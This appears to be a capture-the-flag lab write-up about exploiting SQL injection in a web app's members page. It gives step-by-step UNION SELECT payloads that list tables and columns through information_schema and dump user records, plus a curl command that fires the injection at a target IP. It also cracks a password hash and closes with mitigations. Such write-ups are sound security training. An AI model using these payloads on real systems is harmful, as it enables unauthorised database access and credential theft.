
## Exploit: SQL injection in members list
The `/members` page allows the user to query from a list of members using their id. However, the raw user input is passed as an SQL query, which is verified by a simple litmus test using the true value `0=0`

![image](https://hackmd.io/_uploads/ByRhAxZmex.png)

> 0=0 evaluates to true, and when used in a WHERE clause, it will cause the clause to return all the rows

With this information in mind, an initial structure of the query can be formed, which is believed to be something like this `"SELECT * FROM members WHERE id = " + user_query + ";"` where the results is expecting a single table.

In MYSQL, we are able to combine different data into 1 table using the `UNION SELECT` function. Which we will use to append more information to the orignal query such as the table names. 

To get such information in MYSQL, we need to query from the `information_schema.tables` field.

```SQL
0=0 UNION SELECT table_name FROM information_schema.tables
```

This will give us an error `The used SELECT statements have a different number of columns` which shows us that we are on the right path. We just needed to match the number of columns selected in the UNION SELECT statement to match the number of columns selected in the original query, which turns out to be 2 

```SQL
0=0 UNION SELECT table_name, table_type FROM information_schema.tables 
```

![image](https://hackmd.io/_uploads/HJMkbWb7ee.png)

From the results, we can determine that the name of the members table is called `users`. Which we can use to search for its column names using the following query

```SQL
0=0 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS 
```

> Adding a WHERE clause to fitler by table name is not viable, since the program automatically escapes any quotes for strings by adding a backtick (\) which causes syntax error

![image](https://hackmd.io/_uploads/Bkt1M-ZQle.png)

With this, the full information of all the users can be displayed with the following SQL query

```
0=0 UNION SELECT first_name, town FROM users UNION SELECT  first_name, country FROM users UNION SELECT  first_name, planet FROM users UNION SELECT  first_name, Commentaire FROM users UNION SELECT  first_name, countersign FROM users 
```

which can be made to a curl command

```
curl "$TARGET_IP/?page=member&id=0%3D0+UNION+SELECT+first_name%2C+town+FROM+users+UNION+SELECT++first_name%2C+country+FROM+users+UNION+SELECT++first_name%2C+planet+FROM+users+UNION+SELECT++first_name%2C+Commentaire+FROM+users+UNION+SELECT++first_name%2C+countersign+FROM+users+&Submit=Submit#" | grep Flag
```

Hints were given to the Flag user

![image](https://hackmd.io/_uploads/SJ6qV-Z7ge.png)

![image](https://hackmd.io/_uploads/S1niVZZQel.png)

The decrypted plaintext is FortyTwo
![image](https://hackmd.io/_uploads/Skomrbbmle.png)

which makes the flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Mitigations
- Use prepared statements in SQL queries
- Use stronger hashing algorithms with more output vector size (harder to wordlist) for passwords
